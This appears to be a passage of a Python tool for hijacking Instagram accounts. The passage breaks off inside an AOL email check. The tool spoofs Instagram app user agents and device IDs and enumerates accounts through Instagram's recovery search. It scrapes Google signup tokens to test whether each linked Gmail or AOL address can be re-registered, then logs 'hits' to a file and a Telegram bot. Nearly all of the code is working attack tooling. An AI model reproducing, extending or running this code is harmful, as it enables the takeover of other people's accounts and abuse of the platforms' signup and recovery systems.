import os
import sys
import re
import json
import string
import random
from random import randrange, choice
import uuid
import time
from datetime import datetime
from threading import Thread, Lock, Event, Semaphore
import queue
import requests
import urllib.parse
import base64
import secrets
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle
import hashlib
import httpx
import proxy_pool

init(autoreset=True)

R     = Fore.RED
G     = Fore.GREEN
Y     = Fore.YELLOW
C     = Fore.CYAN
W     = Fore.WHITE
M     = Fore.MAGENTA
RESET = Style.RESET_ALL
B     = Style.BRIGHT

WORKING_RANGES = [
    (1,             5000000,    2010),
    (5000001,       17750000,   2011),
    (17750001,      279760000,  2012),
    (279760001,     900990000,  2013),
    (900990001,     1629010000, 2014),
    (1629010001,    2369359761, 2015),
    (2369359762,    4239516754, 2016),
    (4239516755,    6345108209, 2017),
    (6345108210,    10016232395,2018),
    (10016232396,   27238602159,2019),
    (27238602160,   43464475395,2020),
    (43464475395,   50289297647,2021),
    (50289297647,   57464707082,2022),
    (57464707082,   63313426938,2023),
    (63313426938,   70134323896,2024),
    (70313426938,   78313496938,2025),
]

def gdate(user_id):
    try:
        user_id = int(user_id)
        for lower, upper, year in WORKING_RANGES:
            if lower <= user_id <= upper:
                return year
        return 2019
    except Exception:
        return 2019

# ── Hits file ──
HITS_FILE       = "weyn_hits.txt"
_hits_file_lock = Lock()

def _write_session_separator(method_num):
    ts  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    sep = (
        "\n" +
        "═" * 54 + "\n" +
        f"  SESSION — METHOD {method_num}  |  {ts}\n" +
        "═" * 54 + "\n\n"
    )
    with _hits_file_lock:
        with open(HITS_FILE, 'a', encoding='utf-8') as f:
            f.write(sep)

def _save_hit_to_file(output):
    with _hits_file_lock:
        with open(HITS_FILE, 'a', encoding='utf-8') as f:
            f.write(output + "\n\n")

# ── Global session registry (used by Stop to kill in-flight requests) ──
_active_sessions      = []
_active_sessions_lock = Lock()

# ── Shared web state (read by /api/stats, written by all run_method* fns) ──
_web_state: dict = {
    'running': False, 'method': None, 'start_time': None,
    'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
    'taken': 0, 'limit': 0, 'total': 0, 'scanned': 0,
    'recent_hits': [], 'tg_status': '', 'tg_error': '',
}

def _register_session(s):
    with _active_sessions_lock:
        _active_sessions.append(s)
    return s

def _interruptible_sleep(duration, stop_event, step=0.2):
    """Sleep for `duration` seconds but wake up early (in <= `step`s) if
    stop_event gets set -- used for backoff sleeps that could otherwise
    block a worker thread for several seconds after Stop is pressed."""
    end = time.time() + duration
    while time.time() < end:
        if stop_event and stop_event.is_set():
            return
        time.sleep(min(step, max(0, end - time.time())))

def close_all_sessions():
    with _active_sessions_lock:
        for s in _active_sessions:
            try:
                s.close()
            except Exception:
                pass
        _active_sessions.clear()

def force_stop():
    """Immediately shut down all thread pools and mark state as stopped."""
    _web_state['running'] = False
    _web_state['start_time'] = None
    for pool_name in ('_m1_pool', '_m1_lookup_pool', '_m2_pool', '_m3_pool'):
        pool = globals().get(pool_name)
        if pool is not None:
            try:
                pool.shutdown(wait=False, cancel_futures=True)
            except Exception:
                pass
    close_all_sessions()

def _send_telegram(token, chat_id, text):
    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": chat_id, "text": text},
            timeout=10
        )
        body = resp.json()
        if body.get('ok'):
            _web_state['tg_status'] = 'ok'
            _web_state['tg_error']  = ''
            return True
        else:
            err = body.get('description', 'Unknown Telegram error')
            _web_state['tg_status'] = 'error'
            _web_state['tg_error']  = err
            return resp.status_code, body
    except Exception as e:
        _web_state['tg_status'] = 'error'
        _web_state['tg_error']  = str(e)
        return False


# ── Telegram send queue ──
#
# Hits are produced by hundreds of concurrent scanner threads, but Telegram
# only allows ~1 message/sec per chat. Instead of firing sendMessage calls
# straight from the scanner threads (which blows through that limit and
# causes messages to silently vanish once Telegram starts rejecting them),
# every hit is pushed onto a queue and a single background thread drains it
# at a safe, steady pace. If Telegram responds with 429, the message stays
# at the front of the queue and the sender sleeps for the `retry_after`
# value Telegram provides, then retries the same message until it goes
# through -- no hit notification is ever dropped.

_TG_MIN_INTERVAL = 1.0  # seconds between sends, keeps us under Telegram's per-chat rate limit

_tg_queue = queue.Queue()
_tg_sender_started = False
_tg_sender_lock = Lock()


def _telegram_sender_loop():
    while True:
        token, chat_id, text = _tg_queue.get()
        while True:
            try:
                resp = requests.post(
                    f"https://api.telegram.org/bot{token}/sendMessage",
                    json={"chat_id": chat_id, "text": text},
                    timeout=10
                )
                if resp.status_code == 429:
                    try:
                        retry_after = resp.json().get('parameters', {}).get('retry_after', 1)
                    except Exception:
                        retry_after = 1
                    time.sleep(max(1, retry_after))
                    continue  # retry the same message, do not drop it

                body = resp.json()
                if body.get('ok'):
                    _web_state['tg_status'] = 'ok'
                    _web_state['tg_error']  = ''
                else:
                    _web_state['tg_status'] = 'error'
                    _web_state['tg_error']  = body.get('description', 'Unknown Telegram error')
            except Exception as e:
                _web_state['tg_status'] = 'error'
                _web_state['tg_error']  = str(e)
            break

        _tg_queue.task_done()
        time.sleep(_TG_MIN_INTERVAL)


def _ensure_telegram_sender():
    global _tg_sender_started
    with _tg_sender_lock:
        if not _tg_sender_started:
            Thread(target=_telegram_sender_loop, daemon=True).start()
            _tg_sender_started = True


def _queue_telegram(token, chat_id, text):
    """Enqueue a hit notification for the background Telegram sender instead
    of sending it inline from the scanner thread."""
    _ensure_telegram_sender()
    _tg_queue.put((token, chat_id, text))

def get_year_range(year_choice):
    if year_choice is None:
        return 1, 78313496938
    for lower, upper, year in WORKING_RANGES:
        if year == year_choice:
            return lower, upper
    return 1, 78313496938


# ══════════════════════════════════════════════════════════
#  METHOD 1 — STATE & COUNTERS
# ══════════════════════════════════════════════════════════

_m1_hits         = 0
_m1_bad_insta    = 0
_m1_bad_email    = 0
_m1_good_insta   = 0
_m1_total        = 0
_m1_taken        = 0
_m1_limit        = 0
_m1_scanned      = 0
_m1_found_emails: list = []
_m1_found_lock   = Lock()
_m1_hit_lock     = Lock()
_m1_pool:        ThreadPoolExecutor = None
_m1_lookup_pool: ThreadPoolExecutor = None  # kept for pool-shutdown compat

# ── M1 constants ──────────────────────────────────────────────────────────────

_M1_TOKEN_FILE = 'gmail_token.txt'

_M1_USER_AGENTS = [
    "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; samsung; SM-S911B; dm1q; qcom; en_US; 475223914)",
    "Instagram 319.0.0.30.121 Android (32/12; 440dpi; 1080x2340; samsung; SM-M336B; m33x; exynos1280; en_US; 471823650)",
    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2340; samsung; SM-M526BR; m52x; qcom; en_US; 483662991)",
    "Instagram 322.0.0.45.112 Android (34/14; 420dpi; 1080x2400; samsung; SM-G998B; dm2q; qcom; en_US; 498112345)",
    "Instagram 318.0.0.22.110 Android (30/11; 400dpi; 1080x2310; samsung; SM-A105F; a10; exynos7884; en_US; 439100111)",
    "Instagram 319.0.0.30.121 Android (31/12; 440dpi; 1080x2400; xiaomi; M2101K6G; sweet; qcom; en_GB; 454782345)",
    "Instagram 321.0.0.28.120 Android (33/13; 440dpi; 1080x2400; xiaomi; 2211133G; ruby; mt6983; en_US; 467882419)",
    "Instagram 320.0.0.34.109 Android (33/13; 400dpi; 1080x2400; xiaomi; 2201117TY; veux; qcom; en_US; 487266531)",
    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1080x2400; xiaomi; Mi 11; venus; qcom; en_US; 499111222)",
    "Instagram 318.0.0.22.110 Android (29/10; 320dpi; 720x1280; xiaomi; Redmi Note 9; merlin; mt6768; en_US; 431200333)",
    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1240x2772; OnePlus; CPH2449; ONEPLUS11; qcom; en_US; 489234551)",
    "Instagram 319.0.0.30.121 Android (32/12; 480dpi; 1080x2412; OnePlus; CPH2413; NE2213; qcom; en_GB; 453228190)",
    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2400; OnePlus; LE2117; OnePlus9; qcom; en_US; 479555666)",
    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2400; OnePlus; IN2017; OnePlus8T; qcom; en_US; 444777888)",
    "Instagram 322.0.0.45.112 Android (34/14; 420dpi; 1080x2400; google; Pixel 7; panther; gs201; en_US; 493245782)",
    "Instagram 321.0.0.28.120 Android (33/13; 480dpi; 1080x2400; google; Pixel 6; oriole; gs101; en_US; 476111333)",
    "Instagram 320.0.0.34.109 Android (33/13; 400dpi; 1080x2340; google; Pixel 5; redfin; sm7250; en_US; 465888999)",
    "Instagram 319.0.0.30.121 Android (31/12; 420dpi; 1080x2400; oppo; CPH2457; PHB110; mt6895; en_US; 462775910)",
    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; oppo; CPH2371; chopin; mt6833; en_GB; 469800111)",
    "Instagram 318.0.0.22.110 Android (29/10; 320dpi; 720x1280; oppo; CPH1909; CPH1909; mt6762; en_US; 439222444)",
    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2400; vivo; V2145; PD2145; mt6893; en_US; 478932112)",
    "Instagram 319.0.0.30.121 Android (32/12; 480dpi; 1080x2400; vivo; V2072A; PD2072; qcom; en_US; 471555777)",
    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2400; vivo; V2036; PD2036; mt6768; en_GB; 452333555)",
    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2400; realme; RMX3311; serpent; qcom; en_US; 442119875)",
    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; realme; RMX3710; halo; mt6833; en_GB; 469862234)",
    "Instagram 320.0.0.34.109 Android (33/13; 400dpi; 1080x2400; realme; RMX3396; RE58B2; qcom; en_US; 475222444)",
    "Instagram 318.0.0.22.110 Android (29/10; 400dpi; 1080x2310; HUAWEI; ELE-L29; hwELE; kirin980; en_GB; 439875334)",
    "Instagram 319.0.0.30.121 Android (31/12; 480dpi; 1080x2400; HUAWEI; CET-AL00; cetus; kirin9000; en_US; 467333555)",
    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2376; honor; FNE-NX9; fne; kirin9000; en_GB; 431597221)",
    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2400; honor; ANY-NX1; any; qcom; en_US; 483111222)",
    "Instagram 322.0.0.45.112 Android (34/14; 440dpi; 1080x2400; motorola; XT2303-2; crosby; qcom; en_US; 492874115)",
    "Instagram 321.0.0.28.120 Android (33/13; 480dpi; 1080x2400; motorola; XT2127-1; nio; qcom; en_US; 479555333)",
    "Instagram 322.0.0.45.112 Android (34/14; 400dpi; 1080x2400; sony; XQ-CT72; pdx234; qcom; en_US; 498722341)",
    "Instagram 319.0.0.30.121 Android (31/12; 480dpi; 1080x2400; sony; XQ-AT52; pdx203; qcom; en_US; 466111444)",
    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1440x3120; lg; LM-V600; judyln; qcom; en_US; 499178234)",
    "Instagram 318.0.0.22.110 Android (29/10; 420dpi; 1080x2400; lg; LM-G710; judyln; qcom; en_US; 438999111)",
]

_M1_WEB_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7827.197 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
]

_M1_DEVICE_IDS = [
    "android-8a1c3f9b5e2d4c7a",
    "android-b2d5e4c8f7a3d9b1",
    "android-c3e6f5d9a8b4c2e0",
    "android-d4f7a6e0b9c5d3f1",
    "android-e5a8b7f1c0d6e4a2",
    "android-f6b9c8a1d2e3f4a5",
    "android-1a2b3c4d5e6f7a8b",
]

# ── M1 session pool ───────────────────────────────────────────────────────────

_M1_SESSION_FILE      = 'instagram_sessions.pkl'
_m1_session_pool      = []
_m1_session_pool_lock = Lock()

def _m1_load_session_pool():
    global _m1_session_pool
    try:
        import pickle
        if os.path.exists(_M1_SESSION_FILE):
            with open(_M1_SESSION_FILE, 'rb') as f:
                data = pickle.load(f)
                working = data.get('working', {})
                _m1_session_pool = list(working.values())
    except Exception:
        _m1_session_pool = []

def _m1_save_session_to_pool(session_data):
    global _m1_session_pool
    if not session_data or 'session_id' not in session_data:
        return
    try:
        import pickle
        with _m1_session_pool_lock:
            _m1_session_pool.append(session_data)
            existing = {}
            if os.path.exists(_M1_SESSION_FILE):
                with open(_M1_SESSION_FILE, 'rb') as f:
                    existing = pickle.load(f)
            working = existing.get('working', {})
            working[session_data['session_id']] = session_data
            with open(_M1_SESSION_FILE, 'wb') as f:
                pickle.dump({'working': working,
                             'not_working': existing.get('not_working', {}),
                             'timestamp': datetime.now().isoformat()}, f)
    except Exception:
        pass

def _m1_get_session_from_pool():
    with _m1_session_pool_lock:
        if _m1_session_pool:
            return random.choice(_m1_session_pool)
    return None

# ── InstaClient ───────────────────────────────────────────────────────────────

class _M1InstaClient:
    def __init__(self):
        self.session    = requests.Session()
        self.csrf_token = None
        self.session_data = {}
        self._device_id_cycle = cycle(_M1_DEVICE_IDS)

        pool_sess = _m1_get_session_from_pool()
        if pool_sess:
            try:
                if 'headers' in pool_sess:
                    self.session.headers.update(pool_sess['headers'])
                if 'cookies' in pool_sess:
                    for c in pool_sess['cookies']:
                        self.session.cookies.set(**c)
                if 'csrf_token' in pool_sess:
                    self.csrf_token = pool_sess['csrf_token']
                    self.session.headers['X-CSRFToken'] = self.csrf_token
                return
            except Exception:
                pass

        self.session.headers.update({
            'User-Agent': random.choice(_M1_USER_AGENTS),
            'X-IG-App-Startup-Country': 'US',
            'X-Bloks-Version-Id': 'ce555e5500576acd8e84a66018f54a05720f2dce29f0bb5a1f97f0c10d6fac48',
            'X-IG-App-ID': random.choice(['567067343352427', '124024574287414']),
            'X-IG-Connection-Type': random.choice(['WIFI', 'MOBILE']),
            'X-IG-Device-ID': next(self._device_id_cycle),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Connection': 'keep-alive',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
        })

    def get_csrf(self, text):
        for p in [r'"csrf_token":"(.*?)"', r'csrftoken=([a-zA-Z0-9]+)']:
            m = re.search(p, text)
            if m:
                self.csrf_token = m.group(1)
                self.session.headers['X-CSRFToken'] = self.csrf_token
                return self.csrf_token
        return None

    def visit_page(self, url):
        try:
            r = self.session.get(url, timeout=10)
            if r.status_code == 200:
                self.get_csrf(r.text)
            return r
        except Exception:
            return None

    def send_recovery(self, url, data=None, extra_headers=None):
        headers = dict(self.session.headers)
        if extra_headers:
            headers.update(extra_headers)
        try:
            r = self.session.post(url, data=data, headers=headers, timeout=10)
            try:
                js = r.json()
                if js.get('status') == 'ok':
                    try:
                        sid = f"session_{hash(self.csrf_token) if self.csrf_token else random.randint(1000,9999)}"
                        self.session_data = {
                            'session_id': sid,
                            'headers': dict(self.session.headers),
                            'cookies': [{'name': c.name, 'value': c.value, 'domain': c.domain, 'path': c.path}
                                        for c in self.session.cookies],
                            'csrf_token': self.csrf_token,
                            'timestamp': datetime.now().isoformat(),
                        }
                        _m1_save_session_to_pool(self.session_data)
                    except Exception:
                        pass
                    return True, js
                return False, None
            except Exception:
                return False, None
        except Exception:
            return False, None

# ── Google token generation ───────────────────────────────────────────────────

def _m1_generate_google_token() -> bool:
    for attempt in range(3):
        try:
            alphabet = 'abcdefghijklmnopqrstuvwxyz'
            n1 = ''.join(random.choices(alphabet, k=random.randint(6, 9)))
            n2 = ''.join(random.choices(alphabet, k=random.randint(3, 9)))
            host = ''.join(random.choices(alphabet, k=random.randint(15, 30)))
            headers = {
                'accept': '*/*',
                'accept-language': 'en-GB,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'user-agent': random.choice(_M1_WEB_USER_AGENTS),
                'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }
            r = requests.get(
                'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                headers=headers, timeout=15
            )
            if r.status_code != 200:
                continue
            tok = re.search(
                r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                r.text
            )
            if not tok:
                continue
            tl = tok.group(2)
            cookies = {'__Host-GAPS': host}
            headers.update({
                'authority': 'accounts.google.com',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            })
            data = {
                'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
            }
            r2 = requests.post(
                'https://accounts.google.com/_/signup/validatepersonaldetails',
                cookies=cookies, headers=headers, data=data, timeout=15
            )
            if '",null,"' in r2.text:
                tl = r2.text.split('",null,"')[1].split('"')[0]
            host = r2.cookies.get('__Host-GAPS', host)
            with open(_M1_TOKEN_FILE, 'w') as f:
                f.write(f'{tl}//{host}\n')
            return True
        except Exception:
            continue

    # Fallback method
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': random.choice(_M1_WEB_USER_AGENTS),
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-same-domain': '1',
        }
        params = {'rpcids': 'NHJMOd', 'source-path': '/lifecycle/steps/signup/username', 'hl': 'en'}
        fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
        data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
        resp = requests.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params, headers=headers, data=data, timeout=15
        )
        tl_match = re.search(r'"TL:([^"]+)"', resp.text)
        if tl_match:
            tl = tl_match.group(1)
            host = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(15, 30)))
            with open(_M1_TOKEN_FILE, 'w') as f:
                f.write(f'{tl}//{host}\n')
            return True
    except Exception:
        pass
    return False

def _m1_token_refresh_background(stop_event):
    """Refresh the Google token every ~5 minutes in the background."""
    _interruptible_sleep(60, stop_event)
    while not stop_event.is_set():
        try:
            _m1_generate_google_token()
        except Exception:
            pass
        _interruptible_sleep(300, stop_event)

# ── Instagram lookup (bloks endpoint) ────────────────────────────────────────

def _m1_lookup(email: str) -> bool:
    global _m1_good_insta, _m1_bad_insta
    device   = 'android-' + ''.join(random.choices(string.hexdigits.lower(), k=16))
    family   = str(uuid.uuid4())
    android  = 'android-' + ''.join(random.choices(string.hexdigits.lower(), k=16))
    waterfall = str(uuid.uuid4())

    payload = {
        'params': (
            '{"client_input_params":{"aac":"{\\"aac_init_timestamp\\":' + str(int(time.time())) +
            ',\\"aacjid\\":\\"' + str(uuid.uuid4()) + '\\",\\"aaccs\\":\\"' + secrets.token_urlsafe(32) +
            '\\"}","flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED",'
            '"READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"},'
            '"was_headers_prefill_available":0,"network_bssid":null,"sfdid":"",'
            '"fetched_email_token_list":{},"search_query":"' + email +
            '","auth_secure_device_id":"","ig_oauth_token":[],"cloud_trust_token":null,'
            '"was_headers_prefill_used":0,"sso_accounts_auth_data":[],"encrypted_msisdn":"",'
            '"device_network_info":null,"text_input_id":"akyuf0:61","zero_balance_state":null,'
            '"android_build_type":"release","accounts_list":[],"is_oauth_without_permission":0,'
            '"ig_android_qe_device_id":"' + device +
            '","gms_incoming_call_retriever_eligibility":"client_not_supported",'
            '"search_screen_type":"email_or_username","is_whatsapp_installed":1,'
            '"lois_settings":{"lois_token":""},"ig_vetted_device_nonce":null,'
            '"headers_infra_flow_id":"","fetched_email_list":[]},'
            '"server_params":{"event_request_id":"' + str(uuid.uuid4()) +
            '","is_from_logged_out":0,"layered_homepage_experiment_group":null,'
            '"device_id":"' + android + '","login_surface":"login_home","waterfall_id":"' +
            waterfall + '","INTERNAL__latency_qpl_instance_id":6.3987980400102E13,'
            '"is_platform_login":0,"context_data":"","login_entry_point":"logged_out",'
            '"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"' + family +
            '","offline_experiment_group":"caa_iteration_v3_perf_ig_4",'
            '"access_flow_version":"pre_mt_behavior","is_from_logged_in_switcher":0,'
            '"qe_device_id":"' + device + '"}}'
        ),
        'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
        'bloks_versioning_id': '5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b',
    }
    headers = {
        'User-Agent': random.choice(_M1_USER_AGENTS),
        'accept-language': 'en-IN, en-US',
        'x-bloks-version-id': '5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b',
        'x-fb-friendly-name': 'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/',
        'x-ig-android-id': android,
        'x-ig-app-id': '567067343352427',
        'x-ig-app-locale': 'en_IN',
        'x-ig-client-endpoint': 'com.bloks.www.caa.ar.search',
        'x-ig-device-id': device,
        'x-ig-family-device-id': family,
        'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-rawclienttime': str(time.time()),
        'x-pigeon-session-id': f'UFS-{uuid.uuid4()}-0',
    }
    try:
        resp = requests.post(
            'https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/',
            data=payload, headers=headers, timeout=20
        )
        if email in resp.text:
            _m1_good_insta += 1
            _web_state['good'] = _m1_good_insta
            return True
        else:
            _m1_bad_insta += 1
            _web_state['bad_insta'] = _m1_bad_insta
            return False
    except Exception:
        _m1_bad_insta += 1
        _web_state['bad_insta'] = _m1_bad_insta
        return False

# ── Gmail availability check ──────────────────────────────────────────────────

def _m1_check_gmail(email: str, session: requests.Session) -> bool:
    global _m1_bad_email
    try:
        username = email.split('@')[0] if '@' in email else email
        with open(_M1_TOKEN_FILE, 'r') as f:
            line = f.read().splitlines()[0]
            tl, host = line.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}',
            'user-agent': random.choice(_M1_USER_AGENTS),
        }
        params = {'TL': tl}
        data = (
            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{username}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
            '&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false'
            '&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22'
            '%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
            '&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )
        resp = session.post(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params, cookies=cookies, headers=headers, data=data, timeout=10
        )
        if '"gf.uar",1' in resp.text:
            return True
        _m1_bad_email += 1
        _web_state['bad_email'] = _m1_bad_email
        return False
    except Exception:
        _m1_bad_email += 1
        _web_state['bad_email'] = _m1_bad_email
        return False

# ── AOL availability check ────────────────────────────────────────────────────

def _m1_check_aol(email: str) -> bool:
    global _m1_bad_email
    username = email.split('@')[0]
    try:
        time.sleep(random.uniform(0.3, 1.0))
        s = requests.Session()
        headers = {
            'authority': 'login.aol.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'user-agent': random.choice(_M1_WEB_USER_AGENTS),
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        create_url = (
            'https://login.aol.com/account/create?specId=yidregsimplified&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3F'
            'activity%3Dheader-signin%26client_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--'
            '%26language%3Dtr-TR%26nonce%3DespCiEVdB33iuFGue3kB74NAbyy3wQWj%26pspid%3D1197806870'
            '%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode'
            '%26scope%3Dmail-r%2520ycal-w%2520openid%2520openid2%2520mail-w%2520mail-x%2520sdps-r%2520msgr-w'
            '%26src%3Dmail%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ'
            '.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tL2QifQ'
            '.JMX40ZssLtCMlaqAOZYFU6Tz6rggXd8IYA-lVO2jkmWcFPGEJ3tTkOj7qGkKjtTLXofPUFFQ6Uzih1pYCkh_fgS1zD8X5Ge3c0oSKTchP4AdNmsEetEyDMoUijvOWJVVbDe0byUHYQzCmE7F-o2187M5fpzxgGEV6U-7Xm4ywaA'
        )
        r1 = s.get(create_url, headers=headers, timeout=15)
        if r1.status_code != 200:
            _m1_bad_email += 1
            _web_state['bad_email'] = _m1_bad_email
            return False

        specId_m   = re.search(r'name="specId"\s+value="([^"]+)"', r1.text)
        acrumb_m   = re.search(r'name="acrumb"\s+value="([^"]+)"', r1.text)
        sessIdx_m  = re.search(r'name="sessionIndex"\s+value="([^"]+)"', r1.text)
        if not all([specId_m, acrumb_m, sessIdx_m]):
            _m1_bad_email += 1
            _web_state['bad_email'] = _m1_bad_email
            return False

        specId       = specId_m.group(1)
        acrumb       = acrumb_m.group(1)
        sessionIndex = sessIdx_m.group(1)
        validate_url = (
            f'https://login.aol.com/account/create/validate?specId={specId}&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3F'
            'activity%3Dheader-signin%26client_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--'
            '%26language%3Dtr-TR%26nonce%3DespCiEVdB33iuFGue3kB74NAbyy3wQWj%26pspid%3D1197806870'
            '%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode'
            '%26scope%3Dmail-r%2520ycal-w%2520openid%2520openid2%2520mail-w%2520mail-x%2520sdps-r%2520msgr-w'
            '%26src%3Dmail%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ'
            '.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tL2QifQ'
